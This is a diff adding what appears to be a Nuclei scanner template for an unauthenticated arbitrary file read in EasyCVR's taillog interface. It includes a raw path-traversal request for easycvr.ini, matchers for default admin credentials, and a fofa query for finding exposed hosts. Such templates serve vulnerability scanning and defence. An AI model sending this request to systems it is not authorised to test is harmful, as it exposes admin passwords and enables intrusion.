@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - default_admin_user=
+            - default_admin_password=
+            - '[user_default]'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: EasyCVR-taillog-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: title="EasyCVR"
+        EasyCVR-视频管理平台 taillog 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: EasyCVR-视频管理平台 taillog 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/Kz-uasc64m7xOn_z8gCZYg?token=17877307&lang=zh_CN
+    severity: high
+    tags:
+        - File reading
+        - EasyCVR
